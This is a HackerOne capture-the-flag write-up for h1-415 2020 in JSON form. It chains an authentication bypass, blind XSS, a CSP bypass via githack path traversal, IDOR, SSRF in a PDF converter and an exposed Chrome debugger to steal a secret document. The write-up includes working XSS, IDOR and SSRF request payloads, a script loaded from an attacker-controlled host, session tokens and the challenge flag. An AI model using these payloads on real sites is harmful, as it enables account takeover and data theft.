{"id":776684,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NzY2ODQ=","url":"https://hackerone.com/reports/776684","title":"[h1-415 2020] My writeup on how to retrieve the special secret document","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-01-17T00:13:11.584Z","submitted_at":"2020-01-17T00:13:11.584Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"blaklis","url":"/blaklis","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/y55gZZ4yuvXeaqGCT6ov8Gqr/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"https://hackyholidays.h1ctf.com","about":"Please help us stop the Grinch!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-02-03T22:42:23.673Z","bug_reporter_agreed_on_going_public_at":"2020-02-03T22:42:23.608Z","team_member_agreed_on_going_public_at":"2020-02-03T20:36:30.922Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nAn attacker without any privilege is able to retrieve the special secret document, hosted on the https://h1-415.h1ctf.com website. To do so, multiple steps are required : \n\n1. The authentication must be bypassed to have a licensed account;\n2. The support team portal is vulnerable to a blind XSS,;\n3. The CSP rules are bypassable using sort of path traversal to render other javascript files on githack CDN.\n4. A direct object reference allow to modify data from every users from the support panel, without filtering of characters.\n5. The document converter is vulnerable to SSRF if the user name contains HTML tags.\n6. The chrome debugger API is opened, allowing to dump data from the browser used by the document converter.\n\nHere are the steps to finally get this special document !\n\n# Initially\n\nYou can register an account on the application. After the registration process, you receive a QRCode which contains two hexadecimal blobs separated by a colon. This QRCode is used in case you forgot your password, and allow to bypass the login process.\n\nThe QRCode first blob is simply the username, in hexadecimal ASCII. By removing the second blob and trying to use the QRCode, the error message indicates that it's a code, that is necessary and correctly validated to allow being logged in with this email.\n\nFrom a simple user without license, fields seems to be well escaped, and the converter seems to works well, without much possibility to exploit anything. Fields (usernames, etc) are correctly filtered; special characters are deleted from those fields.\n\nWe can see from the main page that the Jobert's mail address (jobert@mydocz.cosmic) is leaking from the *data-email* attribute of its message.\n\n# Authentication bypass thanks to data filtering\n\nAs we saw, data are filtered and special characters are deleted from users information. By creating a user with the jobert@mydocz.cosmic\u003c email, the registration process is successful; however, thanks to the data filtering, the generated QRCode contains the real jobert@mydocz.cosmic email instead of the created one, with a code that also matches well.\n\nBy using this QRcode on the https://h1-415.h1ctf.com/recover endpoint, we can now login as Jobert to have a more privileged user, that can use the support endpoint.\n\nWe can't change information for this account, and the license seems to be expired, so we can't even use the upload functionality.\n\n# Blind XSS \u0026 CSP bypass on the support endpoint\n\nThe support endpoint seems to be a chatbot (or a real employee? who knows...), and sending some XSS payloads demonstrates easily that at least the frontend part doesn't sanitize messages at all.\n\nBy sending the \"quit\" message, we're asked to rate the overall communication. If the note is set to the minimum - 1 star - we're notified that an employee will check the discussion to see what happened.\n\nInputting a XSS payload and then quitting with a bad rating for this discussion, we can trap an employee to make him execute some javascript; however, a Content-Security-Policy rules is in place, containing the following : \n\n* default-src 'self'; object-src 'none'; script-src 'self' https://raw.githack.com/mattboldt/typed.js/master/lib/; img-src data: * *\n\nIt also does not leak the referrer, thanks to the *Referrer-Policy* header set to *strict-origin-when-cross-origin*.\n\nAs we can see, we're able to load javascript files from https://raw.githack.com/mattboldt/typed.js/master/lib/ URL, and it's child. I created a new repo on Github, which contains some of my javascript payload. Here is an example, that extracts the current URL to my own server : \n\n*https://github.com/Blaklis/typed.js/blob/master/lib/yolo.js*\n\nAs Githack serves GItHub files directly, as a CDN, and that it treats ..%2f as a traversal, we can simply point to our files using the following URL : \n\n*https://raw.githack.com/mattboldt/typed.js/master/lib/..%2f..%2f..%2f..%2fBlaklis/typed.js/master/lib//yolo.js*\n\nFor the browser, this URL is a child of *https://raw.githack.com/mattboldt/typed.js/master/lib/* and completely respects the CSP rule.\n\nFinal payload : \u003cscript src=\"https://raw.githack.com/mattboldt/typed.js/master/lib/..%252f..%252f..%252f..%252fBlaklis/typed.js/master/lib//yolo.js\"/\u003e\n\nThis leaks a URL that is directly accessible - even unauthenticated - to the support panel for this very own discussion, for example https://h1-415.h1ctf.com/support/review/5529c168769ff7e096bb40cc9438a5295692bb567844c837bb5fae37980612ee\n\n# Direct object reference allows to edit every users' information without filtering\n\nWhen we're on the support page, we can see a form that allow to change users' information. This form also contains a *user_id* field, which is not checked at all. Consequently, we're able to change every users name through this page.\nAlso, we can see that there's no filtering on characters on this page, allowing to includes some XSS payload in the name, while it wasn't possible for the public /settings endpoint.\n\nThe jobert's account can't be modified, even with this method. We can so create an account, and then edit it through this way to have some forbidden characters in its name.\n\nA payload example, considering we own the user 16 : \n\n```\nPOST /support/review/85c8e222848012b567fed595a6bdcb3b57ce6bce4716d132e8361536fcc29031 HTTP/1.1\n[...]\nCookie: _csrf_token=312edf8cc51423f130df5a09c958c4855eff90c7; session=.eJwli8sOgjAQRb_FWRPSp5au-Ah3xpA6zCiBFkPrghj_3RpXJ-fk3jcMmDceyjpTAg9aKhrZIVpplGapxcg2iA4769A4a4m5E3iCBvARCvjLtQGKYVrq-baEeZlym6Ztr-zvv97iGuv6lWkbyv4k8PpvKcQqcKZcpNLGHg_w-QKRNi0N.XiDmKA.o5lphYOx41pDSbeAm37D7wA9grg\n\nname=\u003cscript src=\"http://blakl.is/pwn.js\"/\u003e\u0026user_id=16\u0026_csrf_token=312edf8cc51423f130df5a09c958c4855eff90c7\n```\n\n# SSRF in document conversion\n\nThe document converter allow to upload images to get PDF as output. The PDF also contains the owner's name, and is vulnerable to a XSS when being interpreted by the converter. This allows to make some redirect using a \u003cscript\u003edocument.location.href='//website'\u003c/script\u003e payload, for example. It also interprets iframe, which allow to inspects which ports are opened locally easily.\n\nI saw that ~300 iframes in the same document is possible without having a timeout from the converter. This allow to create a lot of iframes to localhost, with different ports, to see if it outputs something. Multiple ports have been found open, and notably : \n\n- 80\n- 443\n- 3000\n- 9222\n- 13398\n\nThe 9222 port responds with a \"Inspectable web contents\" message, which corresponds to the debugger API from Chrome, which is a pretty interesting target.\n\nHere is an example payload that sets the payload in the name of the user 16 : \n\n``\nPOST /support/review/85c8e222848012b567fed595a6bdcb3b57ce6bce4716d132e8361536fcc29031 HTTP/1.1\n[...]\nCookie: _csrf_token=312edf8cc51423f130df5a09c958c4855eff90c7; session=.eJwli8sOgjAQRb_FWRPSp5au-Ah3xpA6zCiBFkPrghj_3RpXJ-fk3jcMmDceyjpTAg9aKhrZIVpplGapxcg2iA4769A4a4m5E3iCBvARCvjLtQGKYVrq-baEeZlym6Ztr-zvv97iGuv6lWkbyv4k8PpvKcQqcKZcpNLGHg_w-QKRNi0N.XiDmKA.o5lphYOx41pDSbeAm37D7wA9grg\n\nname=\u003ciframe src=\"http://localhost:9222\"/\u003e\u0026user_id=16\u0026_csrf_token=312edf8cc51423f130df5a09c958c4855eff90c7\n```\n\nThe user 16 is now able to make a document conversion. The output document will contains an iframe with data from http://localhost:9222.\n\n# Chrome debugger API opened\n\nThe Chrome debugger API is enabled and can be accessed through the SSRF from the previous step. There are both a Websocket API (complete) and a JSON API (limited) that allows to retrieve data from this interface.\n\nBy using the JSON api, hitting the */json/list* endpoint, we can see every tabs that are currently opened, with associated URLs and titles. Here is a sample of data returned : \n\n```\n[ {   \"description\": \"\",   \"devtoolsFrontendUrl\": \"/devtools/inspector.html?ws=localhost:9222/devtools/page/06B5383E01A67809265501A45699022A\",   \"id\": \"06B5383E01A67809265501A45699022A\",   \"title\": \"My Docz Converter\",   \"type\": \"page\",   \"url\":\"http://localhost:3000/converter/de5be989b6ba5bf281074073611b12a2cef1fab3fb24f99decc6be773fce5927.png?user_name=Jobert%3Cscript%3Edocument.location.href%3D%27http%3A//localhost%3A9222/json%27%3C/script%3E\",   \"webSocketDebuggerUrl\": \"ws://localhost:9222/devtools/page/06B5383E01A67809265501A45699022A\"}, {   \"description\": \"\",   \"devtoolsFrontendUrl\": \"/devtools/inspector.html?ws=localhost:9222/devtools/page/40B45AD7E01052E5E79BE278D1C6F03C\",   \"id\": \"40B45AD7E01052E5E79BE278D1C6F03C\",   \"title\": \"My Docz Converter\",   \"type\": \"page\",   \"url\": \"http://localhost:3000/login?secret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf\",   \"webSocketDebuggerUrl\": \"ws://localhost:9222/devtools/page/40B45AD7E01052E5E79BE278D1C6F03C\"}, {   \"description\": \"\",   \"devtoolsFrontendUrl\": \"/devtools/inspector.html?ws=localhost:9222/devtools/page/69206B536A6D44F4950C2BE822522BF8\",   \"id\": \"69206B536A6D44F4950C2BE822522BF8\",   \"title\": \"about:blank\",   \"type\": \"page\",   \"url\": \"about:blank\",   \"webSocketDebuggerUrl\": \"ws://localhost:9222/devtools/page/69206B536A6D44F4950C2BE822522BF8\"}, {   \"description\": \"\",   \"devtoolsFrontendUrl\": \"/devtools/inspector.html?ws=localhost:9222/devtools/page/37FC54275A3B9966EE6307427568FF34\",   \"id\": \"37FC54275A3B9966EE6307427568FF34\",   \"title\": \"about:blank\",   \"type\": \"page\",   \"url\": \"about:blank\",   \"webSocketDebuggerUrl\": \"ws://localhost:9222/devtools/page/37FC54275A3B9966EE6307427568FF34\"}, {   \"description\": \"\",   \"devtoolsFrontendUrl\": \"/devtools/inspector.html?ws=localhost:9222/devtools/page/D06A13E7032D841AD5B56B06F055B4B9\",   \"id\": \"D06A13E7032D841AD5B56B06F055B4B9\",   \"title\": \"about:blank\",   \"type\": \"page\",   \"url\": \"about:blank\",   \"webSocketDebuggerUrl\": \"ws://localhost:9222/devtools/page/D06A13E7032D841AD5B56B06F055B4B9\"} ]\n```\n\nAs we can see, there is a *http://localhost:3000/login?secret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf* tab that is opened. By retrieving the secret document name, and trying to access it as a normal document, we can see the secret document here : \n\n*https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf*\n\nThe flag is *h1ctf{y3s_1m_c0sm1c_n0w}*\n\n\nThis was a nice challenge, thank you for that!\n\nBest regards,\nBlaklis\n\n## Impact\n\nAttackers are able to access the very secret document from Jobert!","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eAn attacker without any privilege is able to retrieve the special secret document, hosted on the \u003ca title=\"https://h1-415.h1ctf.com\" href=\"/redirect?url=https%3A%2F%2Fh1-415.h1ctf.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://h1-415.h1ctf.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e website. To do so, multiple steps are required : \u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eThe authentication must be bypassed to have a licensed account;\u003c/li\u003e\n\u003cli\u003eThe support team portal is vulnerable to a blind XSS,;\u003c/li\u003e\n\u003cli\u003eThe CSP rules are bypassable using sort of path traversal to render other javascript files on githack CDN.\u003c/li\u003e\n\u003cli\u003eA direct object reference allow to modify data from every users from the support panel, without filtering of characters.\u003c/li\u003e\n\u003cli\u003eThe document converter is vulnerable to SSRF if the user name contains HTML tags.\u003c/li\u003e\n\u003cli\u003eThe chrome debugger API is opened, allowing to dump data from the browser used by the document converter.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eHere are the steps to finally get this special document !\u003c/p\u003e\n\n\u003ch1 id=\"initially\"\u003eInitially\u003c/h1\u003e\n\n\u003cp\u003eYou can register an account on the application. After the registration process, you receive a QRCode which contains two hexadecimal blobs separated by a colon. This QRCode is used in case you forgot your password, and allow to bypass the login process.\u003c/p\u003e\n\n\u003cp\u003eThe QRCode first blob is simply the username, in hexadecimal ASCII. By removing the second blob and trying to use the QRCode, the error message indicates that it\u0026#39;s a code, that is necessary and correctly validated to allow being logged in with this email.\u003c/p\u003e\n\n\u003cp\u003eFrom a simple user without license, fields seems to be well escaped, and the converter seems to works well, without much possibility to exploit anything. Fields (usernames, etc) are correctly filtered; special characters are deleted from those fields.\u003c/p\u003e\n\n\u003cp\u003eWe can see from the main page that the Jobert\u0026#39;s mail address (\u003ca title=\"jobert@mydocz.cosmic\" href=\"mailto:jobert@mydocz.cosmic\" rel=\"nofollow noopener noreferrer\"\u003ejobert@mydocz.cosmic\u003c/a\u003e) is leaking from the \u003cem\u003edata-email\u003c/em\u003e attribute of its message.\u003c/p\u003e\n\n\u003ch1 id=\"authentication-bypass-thanks-to-data-filtering\"\u003eAuthentication bypass thanks to data filtering\u003c/h1\u003e\n\n\u003cp\u003eAs we saw, data are filtered and special characters are deleted from users information. By creating a user with the \u003ca title=\"jobert@mydocz.cosmic\" href=\"mailto:jobert@mydocz.cosmic\" rel=\"nofollow noopener noreferrer\"\u003ejobert@mydocz.cosmic\u003c/a\u003e\u0026lt; email, the registration process is successful; however, thanks to the data filtering, the generated QRCode contains the real \u003ca title=\"jobert@mydocz.cosmic\" href=\"mailto:jobert@mydocz.cosmic\" rel=\"nofollow noopener noreferrer\"\u003ejobert@mydocz.cosmic\u003c/a\u003e email instead of the created one, with a code that also matches well.\u003c/p\u003e\n\n\u003cp\u003eBy using this QRcode on the \u003ca title=\"https://h1-415.h1ctf.com/recover\" href=\"/redirect?url=https%3A%2F%2Fh1-415.h1ctf.com%2Frecover\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://h1-415.h1ctf.com/recover\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e endpoint, we can now login as Jobert to have a more privileged user, that can use the support endpoint.\u003c/p\u003e\n\n\u003cp\u003eWe can\u0026#39;t change information for this account, and the license seems to be expired, so we can\u0026#39;t even use the upload functionality.\u003c/p\u003e\n\n\u003ch1 id=\"blind-xss\"\u003eBlind XSS \u0026amp; CSP bypass on the support endpoint\u003c/h1\u003e\n\n\u003cp\u003eThe support endpoint seems to be a chatbot (or a real employee? who knows...), and sending some XSS payloads demonstrates easily that at least the frontend part doesn\u0026#39;t sanitize messages at all.\u003c/p\u003e\n\n\u003cp\u003eBy sending the \u0026quot;quit\u0026quot; message, we\u0026#39;re asked to rate the overall communication. If the note is set to the minimum - 1 star - we\u0026#39;re notified that an employee will check the discussion to see what happened.\u003c/p\u003e\n\n\u003cp\u003eInputting a XSS payload and then quitting with a bad rating for this discussion, we can trap an employee to make him execute some javascript; however, a Content-Security-Policy rules is in place, containing the following : \u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003edefault-src \u0026#39;self\u0026#39;; object-src \u0026#39;none\u0026#39;; script-src \u0026#39;self\u0026#39; \u003ca title=\"https://raw.githack.com/mattboldt/typed.js/master/lib/\" href=\"/redirect?url=https%3A%2F%2Fraw.githack.com%2Fmattboldt%2Ftyped.js%2Fmaster%2Flib%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://raw.githack.com/mattboldt/typed.js/master/lib/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e; img-src data: * *\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eIt also does not leak the referrer, thanks to the \u003cem\u003eReferrer-Policy\u003c/em\u003e header set to \u003cem\u003estrict-origin-when-cross-origin\u003c/em\u003e.\u003c/p\u003e\n\n\u003cp\u003eAs we can see, we\u0026#39;re able to load javascript files from \u003ca title=\"https://raw.githack.com/mattboldt/typed.js/master/lib/\" href=\"/redirect?url=https%3A%2F%2Fraw.githack.com%2Fmattboldt%2Ftyped.js%2Fmaster%2Flib%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://raw.githack.com/mattboldt/typed.js/master/lib/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e URL, and it\u0026#39;s child. I created a new repo on Github, which contains some of my javascript payload. Here is an example, that extracts the current URL to my own server : \u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003e\u003ca title=\"https://github.com/Blaklis/typed.js/blob/master/lib/yolo.js\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FBlaklis%2Ftyped.js%2Fblob%2Fmaster%2Flib%2Fyolo.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/Blaklis/typed.js/blob/master/lib/yolo.js\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\n\u003cp\u003eAs Githack serves GItHub files directly, as a CDN, and that it treats ..%2f as a traversal, we can simply point to our files using the following URL : \u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003e\u003ca title=\"https://raw.githack.com/mattboldt/typed.js/master/lib/..%2f..%2f..%2f..%2fBlaklis/typed.js/master/lib//yolo.js\" href=\"/redirect?url=https%3A%2F%2Fraw.githack.com%2Fmattboldt%2Ftyped.js%2Fmaster%2Flib%2F..%252f..%252f..%252f..%252fBlaklis%2Ftyped.js%2Fmaster%2Flib%2F%2Fyolo.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://raw.githack.com/mattboldt/typed.js/master/lib/..%2f..%2f..%2f..%2fBlaklis/typed.js/master/lib//yolo.js\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\n\u003cp\u003eFor the browser, this URL is a child of \u003cem\u003e\u003ca title=\"https://raw.githack.com/mattboldt/typed.js/master/lib/\" href=\"/redirect?url=https%3A%2F%2Fraw.githack.com%2Fmattboldt%2Ftyped.js%2Fmaster%2Flib%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://raw.githack.com/mattboldt/typed.js/master/lib/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/em\u003e and completely respects the CSP rule.\u003c/p\u003e\n\n\u003cp\u003eFinal payload : \u0026lt;script src=\u0026quot;https://raw.githack.com/mattboldt/typed.js/master/lib/..%252f..%252f..%252f..%252fBlaklis/typed.js/master/lib//yolo.js\u0026quot;/\u0026gt;\u003c/p\u003e\n\n\u003cp\u003eThis leaks a URL that is directly accessible - even unauthenticated - to the support panel for this very own discussion, for example \u003ca title=\"https://h1-415.h1ctf.com/support/review/5529c168769ff7e096bb40cc9438a5295692bb567844c837bb5fae37980612ee\" href=\"/redirect?url=https%3A%2F%2Fh1-415.h1ctf.com%2Fsupport%2Freview%2F5529c168769ff7e096bb40cc9438a5295692bb567844c837bb5fae37980612ee\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://h1-415.h1ctf.com/support/review/5529c168769ff7e096bb40cc9438a5295692bb567844c837bb5fae37980612ee\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"direct-object-reference-allows-to-edit-every-users-information-without-filtering\"\u003eDirect object reference allows to edit every users\u0026#39; information without filtering\u003c/h1\u003e\n\n\u003cp\u003eWhen we\u0026#39;re on the support page, we can see a form that allow to change users\u0026#39; information. This form also contains a \u003cem\u003euser_id\u003c/em\u003e field, which is not checked at all. Consequently, we\u0026#39;re able to change every users name through this page.\u003cbr\u003e\nAlso, we can see that there\u0026#39;s no filtering on characters on this page, allowing to includes some XSS payload in the name, while it wasn\u0026#39;t possible for the public /settings endpoint.\u003c/p\u003e\n\n\u003cp\u003eThe jobert\u0026#39;s account can\u0026#39;t be modified, even with this method. We can so create an account, and then edit it through this way to have some forbidden characters in its name.\u003c/p\u003e\n\n\u003cp\u003eA payload example, considering we own the user 16 : \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /support/review/85c8e222848012b567fed595a6bdcb3b57ce6bce4716d132e8361536fcc29031 HTTP/1.1\n[...]\nCookie: _csrf_token=312edf8cc51423f130df5a09c958c4855eff90c7; session=.eJwli8sOgjAQRb_FWRPSp5au-Ah3xpA6zCiBFkPrghj_3RpXJ-fk3jcMmDceyjpTAg9aKhrZIVpplGapxcg2iA4769A4a4m5E3iCBvARCvjLtQGKYVrq-baEeZlym6Ztr-zvv97iGuv6lWkbyv4k8PpvKcQqcKZcpNLGHg_w-QKRNi0N.XiDmKA.o5lphYOx41pDSbeAm37D7wA9grg\n\nname=\u0026lt;script src=\u0026quot;http://blakl.is/pwn.js\u0026quot;/\u0026gt;\u0026amp;user_id=16\u0026amp;_csrf_token=312edf8cc51423f130df5a09c958c4855eff90c7\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"ssrf-in-document-conversion\"\u003eSSRF in document conversion\u003c/h1\u003e\n\n\u003cp\u003eThe document converter allow to upload images to get PDF as output. The PDF also contains the owner\u0026#39;s name, and is vulnerable to a XSS when being interpreted by the converter. This allows to make some redirect using a \u0026lt;script\u0026gt;document.location.href=\u0026#39;//website\u0026#39;\u0026lt;/script\u0026gt; payload, for example. It also interprets iframe, which allow to inspects which ports are opened locally easily.\u003c/p\u003e\n\n\u003cp\u003eI saw that ~300 iframes in the same document is possible without having a timeout from the converter. This allow to create a lot of iframes to localhost, with different ports, to see if it outputs something. Multiple ports have been found open, and notably : \u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e80\u003c/li\u003e\n\u003cli\u003e443\u003c/li\u003e\n\u003cli\u003e3000\u003c/li\u003e\n\u003cli\u003e9222\u003c/li\u003e\n\u003cli\u003e13398\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThe 9222 port responds with a \u0026quot;Inspectable web contents\u0026quot; message, which corresponds to the debugger API from Chrome, which is a pretty interesting target.\u003c/p\u003e\n\n\u003cp\u003eHere is an example payload that sets the payload in the name of the user 16 : \u003c/p\u003e\n\n\u003cp\u003e``\u003cbr\u003e\nPOST /support/review/85c8e222848012b567fed595a6bdcb3b57ce6bce4716d132e8361536fcc29031 HTTP/1.1\u003cbr\u003e\n[...]\u003cbr\u003e\nCookie: _csrf_token=312edf8cc51423f130df5a09c958c4855eff90c7; session=.eJwli8sOgjAQRb_FWRPSp5au-Ah3xpA6zCiBFkPrghj_3RpXJ-fk3jcMmDceyjpTAg9aKhrZIVpplGapxcg2iA4769A4a4m5E3iCBvARCvjLtQGKYVrq-baEeZlym6Ztr-zvv97iGuv6lWkbyv4k8PpvKcQqcKZcpNLGHg_w-QKRNi0N.XiDmKA.o5lphYOx41pDSbeAm37D7wA9grg\u003c/p\u003e\n\n\u003cp\u003ename=\u0026lt;iframe src=\u0026quot;http://localhost:9222\u0026quot;/\u0026gt;\u0026amp;user_id=16\u0026amp;_csrf_token=312edf8cc51423f130df5a09c958c4855eff90c7\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\nThe user 16 is now able to make a document conversion. The output document will contains an iframe with data from http://localhost:9222.\n\n# Chrome debugger API opened\n\nThe Chrome debugger API is enabled and can be accessed through the SSRF from the previous step. There are both a Websocket API (complete) and a JSON API (limited) that allows to retrieve data from this interface.\n\nBy using the JSON api, hitting the */json/list* endpoint, we can see every tabs that are currently opened, with associated URLs and titles. Here is a sample of data returned : \n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e[ {   \u0026quot;description\u0026quot;: \u0026quot;\u0026quot;,   \u0026quot;devtoolsFrontendUrl\u0026quot;: \u0026quot;/devtools/inspector.html?ws=localhost:9222/devtools/page/06B5383E01A67809265501A45699022A\u0026quot;,   \u0026quot;id\u0026quot;: \u0026quot;06B5383E01A67809265501A45699022A\u0026quot;,   \u0026quot;title\u0026quot;: \u0026quot;My Docz Converter\u0026quot;,   \u0026quot;type\u0026quot;: \u0026quot;page\u0026quot;,   \u0026quot;url\u0026quot;:\u0026quot;\u003ca title=\"http://localhost:3000/converter/de5be989b6ba5bf281074073611b12a2cef1fab3fb24f99decc6be773fce5927.png?user_name=Jobert%3Cscript%3Edocument.location.href%3D%27http%3A//localhost%3A9222/json%27%3C/script%3E\" href=\"/redirect?url=http%3A%2F%2Flocalhost%3A3000%2Fconverter%2Fde5be989b6ba5bf281074073611b12a2cef1fab3fb24f99decc6be773fce5927.png%3Fuser_name%3DJobert%253Cscript%253Edocument.location.href%253D%2527http%253A%2F%2Flocalhost%253A9222%2Fjson%2527%253C%2Fscript%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://localhost:3000/converter/de5be989b6ba5bf281074073611b12a2cef1fab3fb24f99decc6be773fce5927.png?user_name=Jobert%3Cscript%3Edocument.location.href%3D%27http%3A//localhost%3A9222/json%27%3C/script%3E\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot;,   \u0026quot;webSocketDebuggerUrl\u0026quot;: \u0026quot;ws://localhost:9222/devtools/page/06B5383E01A67809265501A45699022A\u0026quot;}, {   \u0026quot;description\u0026quot;: \u0026quot;\u0026quot;,   \u0026quot;devtoolsFrontendUrl\u0026quot;: \u0026quot;/devtools/inspector.html?ws=localhost:9222/devtools/page/40B45AD7E01052E5E79BE278D1C6F03C\u0026quot;,   \u0026quot;id\u0026quot;: \u0026quot;40B45AD7E01052E5E79BE278D1C6F03C\u0026quot;,   \u0026quot;title\u0026quot;: \u0026quot;My Docz Converter\u0026quot;,   \u0026quot;type\u0026quot;: \u0026quot;page\u0026quot;,   \u0026quot;url\u0026quot;: \u0026quot;\u003ca title=\"http://localhost:3000/login?secret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf\" href=\"/redirect?url=http%3A%2F%2Flocalhost%3A3000%2Flogin%3Fsecret_document%3D0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://localhost:3000/login?secret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot;,   \u0026quot;webSocketDebuggerUrl\u0026quot;: \u0026quot;ws://localhost:9222/devtools/page/40B45AD7E01052E5E79BE278D1C6F03C\u0026quot;}, {   \u0026quot;description\u0026quot;: \u0026quot;\u0026quot;,   \u0026quot;devtoolsFrontendUrl\u0026quot;: \u0026quot;/devtools/inspector.html?ws=localhost:9222/devtools/page/69206B536A6D44F4950C2BE822522BF8\u0026quot;,   \u0026quot;id\u0026quot;: \u0026quot;69206B536A6D44F4950C2BE822522BF8\u0026quot;,   \u0026quot;title\u0026quot;: \u0026quot;about:blank\u0026quot;,   \u0026quot;type\u0026quot;: \u0026quot;page\u0026quot;,   \u0026quot;url\u0026quot;: \u0026quot;about:blank\u0026quot;,   \u0026quot;webSocketDebuggerUrl\u0026quot;: \u0026quot;ws://localhost:9222/devtools/page/69206B536A6D44F4950C2BE822522BF8\u0026quot;}, {   \u0026quot;description\u0026quot;: \u0026quot;\u0026quot;,   \u0026quot;devtoolsFrontendUrl\u0026quot;: \u0026quot;/devtools/inspector.html?ws=localhost:9222/devtools/page/37FC54275A3B9966EE6307427568FF34\u0026quot;,   \u0026quot;id\u0026quot;: \u0026quot;37FC54275A3B9966EE6307427568FF34\u0026quot;,   \u0026quot;title\u0026quot;: \u0026quot;about:blank\u0026quot;,   \u0026quot;type\u0026quot;: \u0026quot;page\u0026quot;,   \u0026quot;url\u0026quot;: \u0026quot;about:blank\u0026quot;,   \u0026quot;webSocketDebuggerUrl\u0026quot;: \u0026quot;ws://localhost:9222/devtools/page/37FC54275A3B9966EE6307427568FF34\u0026quot;}, {   \u0026quot;description\u0026quot;: \u0026quot;\u0026quot;,   \u0026quot;devtoolsFrontendUrl\u0026quot;: \u0026quot;/devtools/inspector.html?ws=localhost:9222/devtools/page/D06A13E7032D841AD5B56B06F055B4B9\u0026quot;,   \u0026quot;id\u0026quot;: \u0026quot;D06A13E7032D841AD5B56B06F055B4B9\u0026quot;,   \u0026quot;title\u0026quot;: \u0026quot;about:blank\u0026quot;,   \u0026quot;type\u0026quot;: \u0026quot;page\u0026quot;,   \u0026quot;url\u0026quot;: \u0026quot;about:blank\u0026quot;,   